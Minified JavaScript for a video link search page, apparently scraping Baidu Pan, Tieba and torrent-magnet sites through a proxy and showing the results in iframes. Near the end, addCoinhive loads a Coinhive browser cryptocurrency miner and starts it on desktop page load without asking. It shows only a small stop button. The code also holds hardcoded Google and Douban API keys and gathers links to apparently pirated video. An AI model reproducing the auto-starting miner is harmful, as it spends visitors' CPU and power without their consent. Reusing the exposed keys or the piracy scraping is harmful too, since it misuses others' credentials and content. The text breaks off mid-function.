function init(){window.config={nodeUrl:"//charon-node.herokuapp.com/",userLang:navigator.language||navigator.userLanguage,key:getURLParameter("search"),dataMin:screen.width>=1500?2:1,bookmark:{"zh-CN":"收藏我,不然下次找不到哦",default:"Bookmark me,if u have next time"},feedback:{"zh-CN":'<a href="#donate" onclick="showAlipay()"><span><img src="img/hb.jpg"/>领了后赏给超龙吧</span></a>',default:'<a href="#donate" onclick="showPayPal()"><span>Feedback?<br/> PayPal leave a message.</span></a>'},hiddenHistory:{"zh-CN":"看过的被隐藏数量是",default:"History be hidden,count is"},fetchers:["panc","panduoduo","magnet","tieba"],balance:{"zh-CN":"余额:",default:"balance"},balanceCredit:{"zh-CN":"个",default:""},accountTitle:{"zh-CN":"你的帐号:",default:"Your account:"}},window.showVideos=[]}function locationParameterChanged(){init();var key=config.key,input=document.getElementsByTagName("input")[0];if(input.oninput=function(e){input.value?setDoubanSearch(input.value,function(){},"searchTop"):setDoubanTop(void 0,!0,function(){})},inIframe()?(document.querySelector(".search-form").style.display="none",mobilecheck()||document.querySelector("#data").classList.add("iniframe")):input.onfocus=function(){setHeight(input,"50%")},"zh-CN"==config.userLang&&document.body.classList.add("zh-CN"),document.getElementsByTagName("form")[0].onsubmit=function(){setHeight(input,"15%")},isDirect(),!key){input.focus(),input.setAttribute("required","required");var subjects=JSON.parse(localStorage.getItem("doubanSearchs"))||[];return subjects&&setDoubanSearchList(subjects,"searchTop",!0),subjects.length<10?setDoubanTop(void 0,!0,function(){loadShare()}):loadShare(),void(subjects=null)}input.value=key,document.getElementsByTagName("title")[0].innerText=key+" in pan.baidu.com sharing";try{var self=syncIsIt().getBykey(key);self.setLocalIframe(self.data)}catch(e){console.log(e)}var fetcherCache=JSON.parse(sessionStorage.getItem(config.key)||"{}");hideShowedCache(fetcherCache.showVideos),loadFetchers(fetcherCache.fetchers,config.key),fetcherCache=null,setDoubanSearch(input.value,function(){loadShare(input.value)},"searchBottom"),loadGoogleEntitie(),inIframe()||isShowBookmark()&&addBookmark()}function hideShowedCache(showVideos){showVideos&&(document.getElementById("history").innerHTML=config.hiddenHistory.lang()+' <a class="history-number" href="javascript:" onclick="showHideVideos()" title="Show">'+showVideos.length+"</a>"),showVideos=null}function showHideVideos(){sessionStorage.removeItem(config.key),location.reload()}function loadFetchers(fetchers,key){(fetchers||config.fetchers).map(function(fetcher,index){fetcher=fetcher||config.fetchers[index],"object"==typeof fetcher&&fetcher.host?window[fetcher.host]=eval(fetcher.host+"Fetcher")(key,fetcher):"string"==typeof fetcher&&("tieba"==fetcher&&"zh-CN"!=config.userLang||(window[fetcher]=eval(fetcher+"Fetcher")(key)))}),fetchers=null}function setHeight(input,height,isTransition){try{input.animate?(input.style.transition="initial",input.animate([{height:height}],{duration:200,iterations:1}),setTimeout(set,200)):set()}catch(e){set()}function set(){input.style.height=height}}function setFontSize(input,maxLength,fontSize){if(!fontSize)fontSize=function(x,y){return x-y<0?y:x}((x=window.innerWidth,y=window.innerHeight,(x-y<0?x:y)/maxLength),16)+"px";var x,y;input.style.fontSize=fontSize}function changeHash(form){return location.hash.substr(1)==form.search.value?Location.reload():location.hash="#"+form.search.value,!1}function setMoreFetcher(button){button.style.display="none";var key=config.key;window.panduoduo=panduoduoFetcher(key),window.tieba=tiebaFetcher(key)}function setMessageForm(key){var sms=new String("有 {0} 吗？\r找到后发给我邮箱或手机\r："),messageForm=document.getElementById("messageForm");messageForm&&(messageForm.message.value=sms.format(key),messageForm.onsubmit=function(e){e.preventDefault();var submit=messageForm.querySelector('[type="submit"]'),tabMessage=document.getElementById("tab-message");submit.classList.add("loading");var uri=config.nodeUrl+"cross",method=messageForm.method,data={crossUrl:messageForm.action,crossMethod:method,message:messageForm.message.value};return ajax(uri,function(data){console.log(data+messageForm.action),tabMessage.click(),submit.classList=[],tabMessage.classList=[],tabMessage.classList.add("success")},function(){submit.classList=[],tabMessage.classList=[],tabMessage.classList.add("error")},method,JSON.stringify(data)),!1})}function loading(is,id){document.getElementById(id||"pancLoading").style.display=is?"block":"none"}function ShowMore(){var length=window.showVideos.length,ways=[panc,tieba,magnet,panduoduo];length<1&&(length=1),setMoreIframe(ways,0,length)}function setMoreIframe(ways,index,length){index||(index=0);length=length||1;if(ways[index]){var videos=ways[index].videos,than=length-videos.length;0==videos.length?setMoreIframe(ways,index+1,than):than>0?(ways[index].setIframe(videos,videos.length,window.showVideos,!0),setMoreIframe(ways,index+1,than)):ways[index].setIframe(videos,length,window.showVideos,!0)}else confirm("noneTemplate",!0)}function fetcher(parameter){var serf={};return serf.dataMin=config.dataMin||1,serf.host=parameter.host,serf.videos=[],serf.fetchUrl=parameter.fetchUrl,serf.parseVideos=parameter.parseVideos,serf.setIframe=function(videos,length,showVideos,doNotCheckInvalid){parameter.setIframe?parameter.setIframe(videos,length,showVideos,doNotCheckInvalid,serf):(videos=videos.splice(0,length)).map(function(video,index){var success=function(){setIframe(video,0==index),showVideos.push(video)};doNotCheckInvalid?success():serf.checkInvalid(video,function(){index>=videos.length-1&&serf.setIframe(serf.videos,1,showVideos)},success)});serf.progress.setNum(serf.videos.length)},serf.checkInvalid=function(video,error,success){parameter.checkInvalid?ajax(config.nodeUrl+"cross?api="+video.url,function(data){data.indexOf("百度网盘-链接不存在")<0?success():error(),data=null},error):success()},serf.onLoaded=function(){parameter.onLoaded?parameter.onLoaded(serf):serf.setIframe(serf.videos,serf.dataMin,window.showVideos)},serf.fetch=parameter.fetch,serf.load=function(cache){serf.progress=innerProgress(serf.host,serf.fetchUrl);var success=function(html){var progress=serf.progress,videos="object"==typeof html?html:serf.parseVideos(html);videos&&0!==videos.length?(progress.success(videos.length),serf.videos=videos,serf.onLoaded(),html=null):progress.none()};return cache?setTimeout(success(cache.videos),100):serf.fetch(serf.host,serf.fetchUrl,success),serf},window[serf.host]=serf,serf.load(parameter.cache)}function panduoduoFetcher(key,cache){var parameter={};return parameter.cache=cache,parameter.host="panduoduo",parameter.fetchUrl="http://www.panduoduo.net/s/comb/n-"+key+"&ty-bd&f-f4",parameter.fetch=fetch,parameter.parseVideos=function(html){return function(html,select){var videos=[],el=document.createElement("html");el.innerHTML=html;for(var as=el.querySelectorAll(select),i=0;i<as.length&&!(videos.length>10);i++){var img=as[i].querySelector('[title="百度云盘资源"]'),type=as[i].querySelector('[href^="/c/"]');if(img&&"视频"==type.innerHTML){var a=as[i].querySelector("a[href^='/r/']"),video={ref:parameter.host,name:a.innerHTML,url:"http://www.panduoduo.net"+a.pathname};videos.push(video)}}return html=el=els=null,videos}(html,".search-page .row")},parameter.onLoaded=function(fetcher){},parameter.setIframe=function(panduoduoVideos,length,showVideos){var videos=panduoduoVideos.splice(0,length);videos.forEach(function(item,index,array){var video,isSrc,wrapper;showVideos.push(item),isSrc=0===index,wrapper=setIframe(video=item,!1,!0),fetch("panduoduo",video.url,function(html){var url=function(html,select){var urlIndex=html.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length;return html.substring(urlIndex,html.indexOf('"',urlIndex))}(html);url||parameter.setIframe(videos,1,window.showVideos),window.showVideos&&isExist(url,window.showVideos)||(video.url=url,setIframeUrl(url=config.nodeUrl+"cross?api="+url,wrapper,isSrc))})})},fetcher(parameter)}function pancFetcher(key,cache){var parameter={};return parameter.cache=cache,parameter.host="panc",parameter.fetchUrl="https://www.panc.cc/s/"+key+"/td",parameter.fetch=nodeFetch,parameter.onLoaded=function(fetcher){fetcher.setIframe(fetcher.videos,fetcher.dataMin,window.showVideos),clearInvalid(fetcher,function(video){fetcher.setIframe([video],1,window.showVideos),fetcher.progress.setNum(fetcher.videos.length)})},parameter.setIframe=function(videos,length,showVideos,doNotCheckInvalid,fetcher){(videos=videos.splice(0,length)).map(function(video,index){checkExistUk(video,showVideos)?(videos.splice(videos.indexOf(video),1),fetcher.progress.setNum(fetcher.videos.length)):(setIframe(video,0==index),showVideos.push(video))}),videos=null},parameter.parseVideos=function(html){return function(html,select){var videos=[],el=document.createElement("html");el.innerHTML=html;for(var as=el.querySelectorAll(select),i=0;i<as.length;i++)videos.push({name:as[i].previousElementSibling.innerHTML,url:as[i].href});return videos}(html,".a_url")},fetcher(parameter)}function fetch(host,api,success){var url=encodeURI(config.nodeUrl+"fetch?api="+api);try{var error=function(){progress(host).error()};ajax(url,success,error)}catch(e){error()}}function nodeFetch(host,api,success){var url=encodeURI(config.nodeUrl+"fetch?npm=node-fetch&api="+api);try{var error=function(){progress(host).error()};ajax(url,success,error)}catch(e){error()}}function cross(host,api,success){var url=encodeURI(config.nodeUrl+"cross?api="+api);try{var error=function(){progress(host).error()};ajax(url,success,error)}catch(e){error()}}function setIframe(video,isSrc,waitUrl,templateId,dataBoxId){video.ref&&"magnet"==video.ref&&(templateId="magnetTemplate"),templateId=templateId||"videoTemplate";var template=document.getElementById(templateId).innerHTML,dataBox=document.getElementById(dataBoxId||"data"),wrapper=document.createElement("div");wrapper.classList.add("video-item"),wrapper.innerHTML=template;var a=wrapper.children[0],url=video.url;if(video.key&&!config.key?(a.href="?search="+video.key,a.innerHTML=video.key,a.target=""):(a.innerHTML=video.name,a.href=video.refUrl||url),"videoTemplate"==templateId){var index=url.indexOf("//");url=url.substr(index>=0?index:0)}var isIt=wrapper.querySelector("[name='isIt']");isIt.value=JSON.stringify(video),(isItTrue(isIt)||video.key)&&(isIt.checked=!0);var key=video.key||config.key;isIt.title="Is this "+key+"?",isIt.dataset.key=key,dataBox.querySelector("iframe[data-src='"+url+"']")||dataBox.querySelector("a[href='"+url+"']")||dataBox.appendChild(wrapper),waitUrl||setIframeUrl(url,wrapper,isSrc,templateId);var fetcherCache=JSON.parse(sessionStorage.getItem(config.key)||"{}");return fetcherCache.fetchers=objectsByStrings(config.fetchers),fetcherCache.showVideos=(fetcherCache.showVideos||[]).concat(showVideos),sessionStorage.setItem(config.key,JSON.stringify(fetcherCache)),fetcherCache=dataBox=iframe=null,wrapper}function objectsByStrings(strings){var objects=[];return strings.map(function(s){objects.push(window[s])}),objects}function setIframeUrl(url,wrapper,isSrc,templateId){if(url){if("videoTemplate"==(templateId=templateId||"videoTemplate")){var iframe=wrapper.querySelector("iframe");isDisableScript(url)&&(iframe.sandbox="allow-same-origin allow-popups allow-forms allow-pointer-lock"),iframe.dataset.src=url,isSrc&&(iframe.src=url),addVideosHandler(iframe)}else if("magnetTemplate"==templateId){wrapper.querySelector("code").innerHTML=url}}else wrapper.removeChild(iframe)}function isExist(url,videos,key){for(var i=0;i<videos.length;i++){key=key||"url";if(videos[i][key]==url)return{i:i}}return!1}function isDisableScript(url){return url.indexOf("pan.baidu.com/pcloud/album/file")>0}function load(uri,fn){var request=new XMLHttpRequest;if(request.open("PUT",uri,!1),request.send(null),200===request.status)return request.responseText}function getURLParameter(name,url){return decodeURIComponent((new RegExp("[?|&]"+name+"=([^&;]+?)(&|#|;|$)").exec(url||location.search)||[null,""])[1].replace(/\+/g,"%20"))||null}function isElementInViewport(el){"function"==typeof jQuery&&el instanceof jQuery&&(el=el[0]);var rect=el.getBoundingClientRect();return rect.top>=0&&rect.left>=0&&rect.bottom<=(window.innerHeight||document.documentElement.clientHeight)&&rect.right<=(window.innerWidth||document.documentElement.clientWidth)}function onVisibilityChange(el,callback){var old_visible;return function(){var visible=isElementInViewport(el);visible!=old_visible&&(old_visible=visible,"function"==typeof callback&&callback())}}function addVideosHandler(iframe){var handler=onVisibilityChange(iframe,function(){iframe.src||(iframe.src=iframe.dataset.src)});window.addEventListener?(addEventListener("DOMContentLoaded",handler,!1),addEventListener("load",handler,!1),addEventListener("scroll",handler,!1),addEventListener("resize",handler,!1)):window.attachEvent&&(attachEvent("onDOMContentLoaded",handler),attachEvent("onload",handler),attachEvent("onscroll",handler),attachEvent("onresize",handler))}function ajax(uri,fn,error,method,data,contentType){var request=new XMLHttpRequest;request.open(method||"GET",uri),request.setRequestHeader("Content-Type",contentType||"text/plain;charset=UTF-8");try{request.send(data||null)}catch(e){error()}return request.onload=function(e){200==this.status?fn(this.response,error):error()},request.onerror=error,request}function isEnglish(string){return!/[^\x00-\x7F]+/.test(string)}function thepiratebayFetcher(key,cache){return magnetFetcher(key,cache)}function diaosisouFetcher(key,cache){return magnetFetcher(key,cache)}function magnetFetcher(key,cache){var parameter={};return parameter.cache=cache,isEnglish(key)?(parameter.host="thepiratebay",parameter.fetchUrl="https://thepiratebay.org/search/"+key+"/0/99/0",parameter.parseVideos=function(html){return function(html){var videos=[],el=document.createElement("html");el.innerHTML=html;for(var els=el.querySelectorAll("#searchResult tbody tr"),i=0;i<els.length;i++){var name=els[i].querySelector(".detLink").innerHTML,url=els[i].querySelector("a[href^='magnet:']").href,video={ref:"magnet",name:name,url:url};videos.push(video)}return html=el=els=null,videos}(html)},parameter.fetch=cross,parameter.onLoaded=function(fetcher){fetcher.setIframe(fetcher.videos,2*fetcher.dataMin,window.showVideos)}):(parameter.host="diaosisou",parameter.fetchUrl="http://www.diaosisou.org/list/"+key+"/1",parameter.parseVideos=function(html){return function(html){var videos=[],videos2=[],el=document.createElement("html");el.innerHTML=html;var els=el.querySelectorAll(".mlist>li");el=null;for(var i=0;i<els.length;i++){var name=els[i].querySelector("a[name='file_title'").innerHTML,url=els[i].querySelector("a[href^='magnet:']").href,video={ref:"magnet",name:name,url:url};video.name.length>=70?videos2.push(video):videos.push(video)}return videos.concat(videos2),html=el=els=null,videos}(html)},parameter.fetch=nodeFetch,parameter.onLoaded=function(fetcher){fetcher.videos[0].name.length<70&&fetcher.setIframe(fetcher.videos,1,window.showVideos)}),window[parameter.host]=fetcher(parameter),window[parameter.host]}function loadError(oError){console.log("The script "+oError.target.src+" is not accessible.")}function importScript(sSrc,fOnload){var oScript=document.createElement("script");return oScript.type="text/javascript",oScript.onerror=loadError,fOnload&&(oScript.onload=fOnload),document.currentScript?document.currentScript.parentNode.insertBefore(oScript,document.currentScript):document.body.appendChild(oScript),oScript.src=sSrc,oScript.abort=function(){return trigger(oScript,"error")},oScript}function trigger(element,event){if(element.dispatchEvent){var evt=document.createEvent("Events");evt.initEvent(event,!0,!0),element.dispatchEvent(evt)}else element.fireEvent?element.fireEvent("on"+event):element["on"+event]()}function progress(host){var _progress=document.getElementById(host+"Progress");if(_progress.interval)return _progress;function frame(){_progress.value>=2e4?(clearInterval(_progress.interval),_progress.error()):_progress.value=_progress.value+10}return _progress.init=function(){_progress.parentNode.parentNode.classList=[],_progress.value=0,_progress.interval=setInterval(frame,10)},_progress.success=function(length){_progress.parentNode.parentNode.classList=[],_progress.parentNode.parentNode.classList.add("success"),clearInterval(_progress.interval),length&&(_progress.nextSibling.innerHTML="<em>"+length+"</em>")},_progress.setNum=function(length){length>0?_progress.success(length):_progress.none()},_progress.none=function(){_progress.parentNode.parentNode.classList=[],_progress.parentNode.parentNode.classList.add("none"),clearInterval(_progress.interval),_progress.nextSibling.innerHTML="<em>0</em>"},_progress.error=function(){_progress.parentNode.parentNode.classList=[],_progress.parentNode.parentNode.classList.add("error"),clearInterval(_progress.interval)},_progress.parentNode.onclick=function(){var fetcher=window[host];if(fetcher&&fetcher.videos.length){var length=fetcher.videos.length,showLength=showVideos.length;length=length>showLength?showLength:length,"panduoduo"==host&&(length=1),setMoreIframe([fetcher],0,length)}},_progress.nextSibling.nextSibling.onclick=function(){var fetcher=window[host];fetcher&&fetcher.load()},_progress}function innerProgress(host,fetchUrl){var progressGroup=document.getElementById("progressGroup");(progressGroup.classList.add("show"),document.getElementById(host+"Progress"))||beforeHTML(progressGroup,'<li><a target="_blank" href="'+fetchUrl+'" title="'+host+'"><i class="'+host+'"></i></a><span class="more" href="javascript:return void()"><progress max="20000" id="'+host+'Progress"></progress><span class="num"></span><span class="reloadSingle" title="Reload"></span></span>',progressGroup.querySelector("li.more"));var _progress=progress(host);return _progress.init(),_progress}function appendHTML(d,html){var wrapper=document.createElement("div");wrapper.innerHTML=html,d.appendChild(wrapper.children[0])}function beforeHTML(d,html,child){var wrapper=document.createElement("div");wrapper.innerHTML=html,d.insertBefore(wrapper.children[0],child)}function checkInvalid(url,error,success){ajax(config.nodeUrl+"cross?api="+url,function(data){data.indexOf("百度网盘-链接不存在")<0?success():error(),data=null},error)}function clearInvalid(fetcher,successOne){try{var array=fetcher.videos;array.map(function(o){o.url.indexOf("pan.baidu.com/s/")>=0||checkInvalid(o.url,function(){array.splice(array.indexOf(o),1),fetcher.progress.setNum(array.length)},function(){successOne&&(successOne(o),successOne=!1)})})}catch(e){}}function setDoubanList(value){var api="https://api.douban.com/v2/movie/search?q="+value;ajax(config.nodeUrl+"cross?api="+api,function(data){for(var html="",subjects=JSON.parse(data).subjects,i=0;i<3&&i<subjects.length;i++)html+=searchToHtml(subjects[i].original_title,subjects[i].images.medium),i<1&&subjects[i].original_title!=subjects[i].title&&(html+=searchToHtml(subjects[i].title,subjects[i].images.medium));var doubanListD=document.getElementById("doubanList");doubanListD.innerHTML=html,doubanListD.style.display="block",data=html=subjects=doubanListD=null})}function setDoubanSearch(value,success,id){if(value=value||config.key)if(window.doubanListId=id,window.doubanRequest&&window.doubanRequest.abort(),"searchBottom"!=id){var api="https://api.douban.com/v2/movie/search?callback=setDoubanSearchCallback&q="+value;window.doubanRequest=importScript(api,success)}else{api="https://api.douban.com/v2/movie/search?q="+value;var uri=config.nodeUrl+"cross?api="+api;window.doubanRequest=ajax(uri,function(data){setDoubanSearchCallback(JSON.parse(data)),success()})}}function setDoubanSearchCallback(data){var subjects=data.subjects;if(subjects&&subjects[0]){setDoubanSearchList(subjects,window.doubanListId);var searchs=JSON.parse(localStorage.getItem("doubanSearchs"))||[],indexO=isExist(subjects[0].title,searchs,"title");indexO?searchs.move(indexO.i,0):(searchs.unshift(subjects[0]),searchs.length=searchs.length>20?20:searchs.length),searchs=JSON.stringify(searchs),localStorage.setItem("doubanSearchs",searchs),subjects=searchs=data=null}}function setDoubanSearchList(subjects,id,islocal){for(var doubanListD=document.getElementById(id)||document.querySelector(".doubanList"),html="",i=0;islocal?i<20&&i<subjects.length:i<5&&i<subjects.length;i++){var title1="zh-CN"==config.userLang?subjects[i].title:subjects[i].original_title,title2="zh-CN"==config.userLang?subjects[i].original_title:subjects[i].title;html+=searchToHtml(title1,subjects[i].images.medium),i<1&&title1!=title2&&!islocal&&(html+=searchToHtml(title2,subjects[i].images.medium))}doubanListD.classList.add("doubanList"),doubanListD.innerHTML=html,html=null}function searchToHtml(title,image){var isSame="";config.key!=title&&(isSame='href="?search='+encodeURIComponent(title)+'"');var imgHtml="";return image&&(imgHtml='<img src="'+image+'"/>'),"<a "+isSame+" >"+imgHtml+"<span>"+title+"<span></a>"}function setDoubanTop(tab,isLazy,success){window.doubanRequest&&window.doubanRequest.abort();var api="https://api.douban.com/v2/movie/top250?apikey=0df993c66c0c636e29ecbb5344252a4a&start="+parseInt(230*Math.random())+"&&callback=setDoubanTopCallback";window.doubanRequest=importScript(api,success)}function setDoubanTopCallback(data){for(var html="",subjects=data.subjects,i=(config.key,0);i<subjects.length;i++){subjects[i];html+=searchToHtml("zh-CN"==config.userLang?subjects[i].title:subjects[i].original_title,subjects[i].images.medium)}html+='<a target="_blank" href="https://movie.douban.com/annual/2017" class="movieannual2017"></a>';var doubanListD=document.getElementById("searchTop")||document.querySelector(".doubanList");doubanListD.innerHTML+=html,doubanListD.classList.add("doubanList"),data=html=subjects=doubanListD=null}function setMagnetTech(tab){tab?tab&&0!=tab.checked&&(setOtherClose(tab),tab.nextElementSibling.nextElementSibling.innerHTML=document.getElementById("magnetTechTemplate").innerHTML):(tab=document.getElementById("tab-Magnet")).parentNode.style.display="inline-block"}function reloadIframe(button){button.previousElementSibling.src=button.previousElementSibling.src}function tiebaFetcher(key,cache){var parameter={};return parameter.cache=cache,parameter.host="tieba",parameter.fetchUrl="http://tieba.baidu.com/f/search/res?ie=utf-8&qw="+key+" pan.baidu",parameter.fetch=cross,parameter.parseVideos=function(html){return function(html,select){var videos=[],el=document.createElement("html");el.innerHTML=html;for(var as=el.querySelectorAll(select),i=0;i<as.length;i++){var p_title=as[i].querySelector(".p_title").innerHTML,refUrlIndex=p_title.indexOf('href="')+6,refUrlEnd=p_title.indexOf('"',refUrlIndex),refUrl=p_title.substring(refUrlIndex,refUrlEnd),html=p_title+as[i].querySelector(".p_content").innerHTML,key=getkey(html),string=as[i].querySelector(".p_title").innerText+" "+as[i].querySelector(".p_content").innerText,keyIndex=string.lastIndexOf(key),url=(string.slice(keyIndex),getUrl(string,keyIndex));key&&check(url)&&videos.push({name:string,url:url,refUrl:"http://tieba.baidu.com"+refUrl})}return videos;function check(url){return!!url&&!(url.indexOf("pan.baidu.com/mbox")>0)}function getUrl(string,keyIndex){var keyIndex2=keyIndex||0,urlIndex=string.indexOf("http",keyIndex2);if(urlIndex>=0){var url=string.slice(urlIndex),match=url.match(/[^\x00-\x7F]|\s|\.\.\.|,/);return url=url.slice(0,match.index)}return keyIndex?getUrl(string):""}function getkey(html){var wrapper=document.createElement("div");wrapper.innerHTML=html;for(var ems=wrapper.querySelectorAll("em"),i=ems.length-1;i>=0;i--)if("pan.baidu"!=ems[i].innerText)return ems[i].innerText;return""}}(html,".s_post")},fetcher(parameter)}function checkExistUk(video,videos){try{for(var newUk=getURLParameter("uk",video.url),i=0;i<videos.length;i++){var uk=getURLParameter("uk",videos[i].url);if(newUk&&newUk==uk)return!0}}catch(e){return!0}return!1}function syncIsIt(key,data){var self={};function setLocal(key,data){var values=JSON.parse(localStorage.getItem(key)||"{}");(data=JSON.parse(data)).map(function(o){o.key==key&&(values[o.url]=o.count)}),localStorage.setItem(key,JSON.stringify(values)),data=null}return self.key=key||config.key,self.data=data||JSON.parse(localStorage.getItem(self.key)||"{}"),self.uri="https://postgrest-taifu.herokuapp.com/testisit3",self.getBykey=function(key){key=key||self.key;return ajax(self.uri+"?order=install_date.desc&key=eq."+key,function(data){console.log(data),self.setIframe(data),setLocal(key,data)},null,"get",null),self},self.setIframe=function(data,id,setKey){(data="string"==typeof data?JSON.parse(data):data).map(function(o){var video=JSON.parse(o.video);video&&(video.key=o.key,setIframe(video,!0,null,null,id))})},self.setLocalIframe=function(data){for(var key in data){var video=data[key];video.key=key,setIframe(video,!0,null,null)}},self.getAll=function(){ajax(self.uri+"?order=install_date.desc&limit=5",function(data){console.log(data),self.setIframe(data,"dataIsIt",!0),setLocal(key,data)},null,"get",null)},self.add=function(key,video){var client=new XMLHttpRequest;client.open("POST",self.uri),client.setRequestHeader("Content-Type","application/json"),client.send(JSON.stringify({url:video.url,key:key,video:JSON.stringify(video)}))},self.delete=function(key,video){ajax(self.uri+"?key=eq."+key+"&url=eq."+video.url,function(data){console.log(data)},null,"delete",null,"application/json")},self}function isItClick(isIt){storageItTrue(isIt.dataset.key||config.key,isIt,!isIt.checked),isIt.classList.add("checked"),document.querySelector(".share-other").setAttribute("checked",isIt.checked)}function storageItTrue(key,isIt,remove){var video=JSON.parse(isIt.value),values=JSON.parse(localStorage.getItem(key)||"{}");values[video.url]=!remove&&video,localStorage.setItem(key,JSON.stringify(values));var sync=syncIsIt(key,values);remove?sync.delete(key,video):(sync.add(key,video),moveItemToTop(isIt))}function moveItemToTop(isIt){var videoItem=closest(isIt,".video-item"),dataD=videoItem.parentNode;dataD.insertBefore(videoItem,dataD.childNodes[0]),document.querySelector('a[href="#data"]').click()}function isItTrue(isIt){var key=config.key,video=JSON.parse(isIt.value);return!!JSON.parse(localStorage.getItem(key)||"{}")[video.url]}function closest(el,selector,stopSelector){for(var retval=null;el;){if(el.matches(selector)){retval=el;break}if(stopSelector&&el.matches(stopSelector))break;el=el.parentElement}return retval}function importCSS(href,cssId){cssId=cssId||"myCss";if(!document.getElementById(cssId)){var head=document.getElementsByTagName("head")[0],link=document.createElement("link");link.id=cssId,link.rel="stylesheet",link.type="text/css",link.href=href,link.media="all",head.appendChild(link)}}function loadShare(key){window.money=Money(),addCoinhive(),addDonate(),importCSS("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css","awesome"),addShare(key),inIframe()||(document.querySelector(".nav-index").style.display="block")}function addShare(key){if(!window.importShare)with(document.querySelector(".share-other").innerHTML=document.getElementById("shareTemplate").innerHTML,window.importShare=importScript("https://wuchaolong.github.io/sante/social-share.js/src/js/qrcode.js",function(){importScript("https://wuchaolong.github.io/sante/social-share.js/src/js/social-share.js",function(){key?(document.querySelector(".share-other").dataset.footnote=key,socialShare(".share-other",{title:key})):socialShare(".share-other")})}),importCSS("https://overtrue.github.io/share.js/dist/css/share.min.css"),window._bd_share_config={common:{bdSnsKey:{},bdText:key||"",bdMini:"2",bdMiniList:!1,bdPic:(document.images[0]||0).src||"",bdStyle:"1",bdSize:"32"},share:{}},document)(getElementsByTagName("head")[0]||body).appendChild(createElement("script")).src="https://wuchaolong.github.io/baiduShare/static/api/js/share.js?v=89860593.js?cdnversion="+~(-new Date/36e5)}function addDonate(){var donateTemplate=document.getElementById("donateTemplate"),donateD=document.getElementById("donate"),spanHtml=config.feedback.lang();donateD.innerHTML=spanHtml+donateTemplate.innerHTML,donateTemplate=donateD=null}function showAlipay(){var iframe=document.querySelector("#donate iframe");(iframe.contentDocument||iframe.contentWindow.document).getElementById("AliPay").click()}function showPayPal(){var iframe=document.querySelector("#donate iframe");(iframe.contentDocument||iframe.contentWindow.document).querySelector("#PayPal a").click()}function addBookmark(){var bookmark=document.createElement("span");bookmark.classList.add("bookmark"),bookmark.title="Bookmark me",bookmark.onclick=function addFavorite(e){try{var bookmarkURL="https://wuchaolong.github.io/video/",bookmarkTitle="Video",confirm=config.bookmark.lang();/Mac/i.test(navigator.userAgent)?alert("Cmd+D "+confirm):alert("Ctrl+D "+confirm),"addToHomescreen"in window&&addToHomescreen.isCompatible?addToHomescreen({autostart:!1,startDelay:0}).show(!0):window.sidebar&&window.sidebar.addPanel?window.sidebar.addPanel(bookmarkTitle,bookmarkURL,""):window.sidebar&&/Firefox/i.test(navigator.userAgent)||window.opera&&window.print?(bookmark.href=bookmarkURL,bookmark.title=bookmarkTitle,bookmark.rel="sidebar",bookmark.removeEventListener("click",addFavorite)):window.external&&"AddFavorite"in window.external&&window.external.AddFavorite(bookmarkURL,bookmarkTitle)}catch(e){return console.log(e),!1}hideBookmark(bookmark);return!1},document.getElementById("top").appendChild(bookmark),bookmark.click()}function hideBookmark(bookmark){document.getElementById("top").removeChild(bookmark),localStorage.setItem("bookmarked",!0)}function isShowBookmark(){var bookmarked=localStorage.getItem("bookmarked"),isOlduser=localStorage.getItem("doubanSearchs"),isDirect=localStorage.getItem("isDirect");return!(bookmarked||!isOlduser||isDirect)}function isDirect(){return document.createElement("a").href=document.referrer,document.createElement("a").href=location.href,!document.referrer&&(localStorage.setItem("isDirect",!0),!0)}function addCoinhive(){screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)&&importScript("https://coin-hive.com/lib/coinhive.min.js",function(){miner=new CoinHive.Anonymous("Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP"),miner.isMobile()||miner.didOptOut(14400)||(localStorage.getItem("removeCoinHive")?stopCoinHive():startCoinHive())})}function startCoinHive(){localStorage.removeItem("removeCoinHive"),clearInterval(miner.interval),miner.start(CoinHive.IF_EXCLUSIVE_TAB),miner.interval=setInterval(function(){miner.getHashesPerSecond();var totalHashes=miner.getTotalHashes(),html=(miner.getAcceptedHashes(),'<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'+totalHashes+'</a><button title="stop" onclick="stopCoinHive()">✗</button>');document.querySelector(".coinhive-miner").innerHTML=html,money.setHash(totalHashes)},1e3)}function stopCoinHive(){localStorage.setItem("removeCoinHive",!0),clearInterval(miner.interval),miner.stop(),miner.interval=setInterval(function(){miner.getHashesPerSecond();var totalHashes=miner.getTotalHashes(),html=(miner.getAcceptedHashes(),'<a href="https://coinhive.com" target="_blank"><i class="navigation-icon"></i>'+totalHashes+'</a><button title="start" onclick="startCoinHive()">▶</button>');document.querySelector(".coinhive-miner").innerHTML=html},1e3)}function loadGoogleEntitie(){importScript("https://kgsearch.googleapis.com/v1/entities:search?query="+config.key+"&key=AIzaSyDTtLX1_UqEksS2zp3SAF1vMaGi3OyfJok&limit=5&indent=True&types=Movie&types=TVSeries&callback=setGoogleEntities&languages="+config.userLang+"&languages=en")}function setGoogleEntities(data){for(var html="",subjects=data.itemListElement,i=0;i<5&&i<subjects.length;i++)if("string"==typeof subjects[i].result.name){html+=searchToHtml(name=subjects[i].result.name)}else{var name;html+=searchToHtml(name=subjects[i].result.name[0]["@value"]);var lastName=subjects[i].result.name[subjects[i].result.name.length-1]["@value"];0==i&&name!==lastName&&(html+=searchToHtml(lastName))}var googleEntitiesD=document.getElementById("googleEntities");googleEntitiesD.innerHTML=html,googleEntitiesD.style.display="block",googleEntitiesD.classList.add("doubanList"),data=html=subjects=googleEntitiesD=null}function inIframe(){try{return window.self!==window.top}catch(e){return!0}}function mobilecheck(){var a,check=!1;return a=navigator.userAgent||navigator.vendor||window.opera,(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s 